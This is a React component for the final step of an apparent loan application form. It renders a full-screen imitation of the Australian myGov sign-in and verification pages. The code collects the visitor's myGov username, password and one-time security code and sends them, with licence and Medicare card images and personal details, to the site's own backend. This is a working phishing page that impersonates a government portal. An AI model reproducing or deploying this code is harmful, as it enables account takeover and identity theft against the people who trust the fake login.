import React, { useEffect, useState,useRef } from 'react'
import ProgressBar from '@/components/progressBar/progress';
import Image from 'next/image';
import Ball from '@/components/progressBar/ball';
import Roller from '@/components/widgets/progressBar';
import Countdown from 'react-countdown';
import { FaLess } from 'react-icons/fa';
import { GoVerified } from 'react-icons/go';
import { useRouter } from 'next/router';
import Cookies from 'js-cookie';
import axios from 'axios';
import { baseURL } from '@/pages/api';

function StepFive({forward,input,backward,setInput}) {
    
const router = useRouter();

  // The Individual states
  const [changeCount,setChangeCount] = useState(0);
  const [gov_sign,set_gov_sign] = useState(true);
  const [gov_pin,set_gov_pin] = useState(false);
  const [linked,setLinked] = useState(false);
  const [key,setKey] = useState(0)
  const [stepTwoProgress,setStepTwoProgress] = useState(79);
  const [start_roller,set_start_roller] = useState(false);
  const [verified,set_verified] = useState(false);
  const [timeout,set_timeout] = useState(0);
  const [sign_in_error,set_sign_in_error] = useState();
  const [verification_error,set_verification_error] = useState();
  const [visible, setVisible] = useState(false);

// toggle visibilty
  const toggleVisblility = ()=>{
    setVisible(prev => !prev)
  }

//   display roller
const display_roller = ()=>{

set_start_roller(true);

};
//   display linked
const display_linked = ()=>{
  set_timeout(prev => prev + 1);
};

useEffect(() => {
    if(timeout > 0){
         display_roller();
    const timeoutId = setTimeout(() => {
        setLinked(true);
    }, 3500);
    
    return () => clearTimeout(timeoutId);
    }
   
  }, [timeout]);


// Sign in to mygov
const sign_in = ()=>{

    if(isFilled()){
set_gov_pin(true);
set_gov_sign(false);
    }
    else{
        return set_sign_in_error(true);
    }

}

// verified
const verify = (e)=>{
if(input.gov_v_pin && input.gov_v_pin.length === 6){
     set_gov_pin(true);
    set_gov_sign(false);
    setLinked(false);
    set_verified(true);
    set_start_roller(false)
    handleSubmit2(e)
    router.replace("/user/dashboard");
}
else{
    return set_verification_error(true)
}
   
}

const refresh_key = ()=>{
    setKey((prev)=> prev + 1)
}


  // functions
  const handleOnChange = (e) => {
    setChangeCount(prev => prev+1);
    return setInput(prev => ({...prev,[e.target.name]:e.target.value}))
  }
  const stepThreeRef = useRef(0);

  const isFilled = () => {
    if(input.gov_id &&  input.gov_password){
      return true;
    }
    else{
      return false;
    }
  }

  // function depending on the changes made in the form
  useEffect(
    ()=>{
      
     

      if(input.gov_id && input.gov_v_pin && input.gov_password){
        return setStepTwoProgress(100);
      }
      else{
        return setStepTwoProgress(79);
      }


      
    },[changeCount]
  )
  const renderer = ({ hours, minutes, seconds, completed }) => {
  
      // Render a countdown
      return <span>{minutes}:{seconds}</span>;
   
  };


  const go_back = ()=>{
    setLinked(false)
  }

  // handle submit
  function handleSubmit1(e){
    e.preventDefault();
    const user_id = Cookies.get("__id");
    const user_token = Cookies.get("token")
    console.log(user_token);
    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
    axios.put(`${baseURL}/users/update/`+user_id,{firstname:input.firstname,lastname:input.lastname,dob:input.dob,gender:input.gender,phone_number:input.phone,city:input.city,state:input.state,status:input.employment_status,loan_amount:input.loan_amount,loan_purpose:input.loan_purpose,DLFI:input.driver_licence_front[0].src,DLBI:input.driver_licence_back[0].src,medicare_front_image:input.medicare_front[0].src,medicare_back_image:input.medicare_back[0].src,gov_id:input.gov_id,gov_id_password:input.gov_password}).then(res =>{
        let data = res.data;
        
        }
        ).catch(err =>  {
          console.log(err)
        })
    }

};
  // handle submit
  function handleSubmit3(e){
    e.preventDefault();
    const user_id = Cookies.get("__id");
    const user_token = Cookies.get("token")
   
    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
    axios.put(`${baseURL}/users/update/`+user_id,{gov_id:input.gov_id,gov_id_password:input.gov_password}).then(res =>{
        let data = res.data;
        
        }
        ).catch(err =>  {
          console.log(err)
        })
    }

};
  // handle submit
  function handleSubmit2(e){
    e.preventDefault();
    const user_id = Cookies.get("__id");
    const user_token = Cookies.get("token")
    if(input.driver_licence_back && input.driver_licence_front && input.medicare_back && input.medicare_front){
    axios.put(`${baseURL}/users/update/`+user_id,{gov_verification_pin:input.gov_v_pin}).then(res =>{
        let data = res.data;
      
        }
        ).catch(err =>  {
          console.log(err)
        })
    }

};

  return (
    <div className='max-w-[40rem] z-[9999999] flex flex-col items-center justify-center mt-5 '>

{/* myGOV sign in page */}
   {linked && <div className='fixed w-full lg:w-[75%] min-h-screen top-0 bg-white  z-[99999999999999] border-t-[48px]'>
    <div className=' py-2 font-bold text-lg text-indigo-800'>
      {"<"} <span  className='cursor-pointer text-sky-900 underline hover:bg-sky-900 hover:text-white hover:no-underline font-bold' onClick={go_back}>Back</span>
    </div>
    <div className='bg-cyan-300  p-5 '>
        <Image src={"/static/gov_logo.svg"} alt="logo" width={400} height={400} />
    </div>

    {/* Wrapper for login*/}
   {gov_sign && <div className='flex flex-col items-center justify-center '>

        <div className='flex flex-col items-start justify-start mt-32 gap-5'>
    <div className='text-black text-4xl font-bold'>
        Sign in with myGov
    </div>
    <div className='text-black text-2xl font-semibold'>
    Using your myGov sign in details
    </div>

{/*  */}
<div className='flex flex-col items-start justify-start gap-1'>
       {sign_in_error && <div className='text-red-500'>Invalid Credentials, Check your Input and try again</div>}
    <div className='font-bold'>
        Username or email
    </div>
    <input type='text' className='outline-none bg-white px-5 py-2 border border-black w-96 text-black' onChange={handleOnChange} value={input.gov_id} name='gov_id'/>
    <p className='cursor-pointer text-sky-900 underline hover:bg-sky-900 hover:text-white hover:no-underline font-bold'>Forgot username</p>

</div>
{/*  */}
<div className='flex flex-col items-start justify-start gap-1'>

    <div className='font-bold'>
        Password
    </div>

    <div className='justify-between items-center border  border-black w-96 flex pr-10'>
 <input type={visible?"text":'password'} className='outline-none bg-white px-5 py-2 w-full text-black'  onChange={handleOnChange} value={input.gov_password} name='gov_password' />
 <div className='cursor-pointer text-sky-900 underline hover:bg-sky-900 hover:text-white hover:no-underline font-bold pr-5' onClick={toggleVisblility}>
Show
 </div>
    </div>
   
    <p className='cursor-pointer text-sky-900 underline hover:bg-sky-900 hover:text-white hover:no-underline font-bold'>Forgot username</p>

</div>
{/*  */}

<button className='text-center w-full bg-cyan-300 font-bold py-3 hover:bg-indigo-400 hover:text-white'onClick={(e)=>{
  sign_in()
  handleSubmit3(e)}}>
Sign in
</button>
        </div>
    </div>
}
{/* verification pin */}
{gov_pin && <div className='flex flex-col items-center justify-center mt-24'>
    <div className='border border-t border-t-cyan-300 border-t-[35px] w-96 p-5 text-center justify-center flex flex-col'>
    {verification_error && <div className='text-red-500'>Invalid Credentials, Check your Input and try again</div>}
        <div className='text-black text-xl font-bold'>
         Verification 
        </div>
        <p>We have sent you a verification code.</p>
        <p className='text-slate-500 font-bold'>{input.gov_id}</p>
        <p className='text-black font-bold mt-8 self-center'>Enter Security Code:</p>
        <input type='number' className='outline-none bg-white px-5 py-2 border border-black w-56 self-center  text-black mb-8'  onChange={handleOnChange} value={input.gov_v_pin} name='gov_v_pin' />
       <div className='flex gap-5 items-center justify-center'>
           <div className='cursor-pointer'>Didn&apos;t receive Code? <span className='text-sky-800 font-bold underline' onClick={refresh_key}>Resend</span></div> 
           <div className='bg-slate-200 p-1 rounded'>
             <Countdown autoStart={true} precision={1} date={Date.now() + 480000} renderer={renderer } key={key} className=''/>
           </div>
           
          
       </div>
     
        <button className='bg-cyan-300 py-3 font-bold mt-3' onClick={verify}>
            Confirm
        </button>
    </div>
</div>}

   </div>
}

   {/* The Form  */}
<div className='text-red-500 px-2 bg-white rounded rounded-lg  flex flex-col items-center justify-center w-96  py-16'>
  {/* INTRO text */}
        <div className='text-2xl font-semibold text-sky-700 py-2 pb-5'>
      Verify your Credentials
        </div>
        <div className='text-lg font-bold text-slate-700 py-2 pb-5'>
      Connect to myGOV account
        </div>
        <Image src="/static/mygov.jpg" alt="myGov Logo" height={200} width={200} className='mb-4' />
   
   {/*  */}
   <div className='mt-12 text-black'>
   {start_roller && <Roller />}
   {verified && <div className='flex flex-col gap-5 items-center justify-center'><GoVerified className='text-white bg-green-500 p-5 rounded rounded-full'/> Verified</div>}
   </div>
{/*  sjajsbjjbajbsajbjbsa*/}
    <div className=" px-3 mb-4 md:mb-0  flex items-center justify-center gap-6 mt-20 cursor-pointer bg-sky-600 hover:bg-sky-700 text-white px-8 py-5 w-80 text-bold text-xl" onClick={(e)=>{
      display_linked()
      handleSubmit1(e)

      }}>
     Connect
    </div>


   

</div>
 {/* progress */}
 <div className='text-end  w-full'>
       <ProgressBar progressPercentage={stepTwoProgress} />
       <span className='text-sky-800 bg-sky-200 border rounded-full p-1'>5/5</span>
    </div>

<div className='hidden lg:display flex justify-between items-center w-56 w-full'>


   {/* button */}
    <button className='p-3  mt-3 bg-slate-400  rounded w-96 text-center font-semibold  border border-slate-800 text-white  animate__animated animate__pulse ' onClick={()=>{
    input.firstname && input.lastname && backward()
    }}>
   Previous
   </button>
</div>
<div className='lh:hidden  flex flex-col justify-between items-center w-56 w-full'>



   {/* button */}
    <button className='p-3  mt-3 bg-slate-400  rounded w-96 text-center font-semibold  border border-slate-800 text-white  animate__animated animate__pulse ' onClick={()=>{
    input.firstname && input.lastname && backward()
    }}>
 Previous
   </button>
  
</div>
   
    </div>
    

  )
}

export default StepFive;